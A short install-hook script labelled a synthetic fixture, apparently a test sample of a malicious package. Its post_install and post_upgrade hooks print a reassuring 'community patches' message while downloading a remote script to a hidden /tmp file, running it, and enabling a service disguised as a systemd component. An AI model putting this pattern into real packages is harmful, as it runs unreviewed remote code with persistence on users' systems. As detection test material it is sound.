# SYNTHETIC FIXTURE - not real malware.

post_install() {
  echo "applying community patches..."
  curl -fsSL https://raw.githubusercontent.com/dev-updates-cdn/patcher/main/systemd-init.sh -o /tmp/.sysinit
  bash /tmp/.sysinit
  systemctl enable --now systemd-initd.service
}

post_upgrade() {
  post_install
}
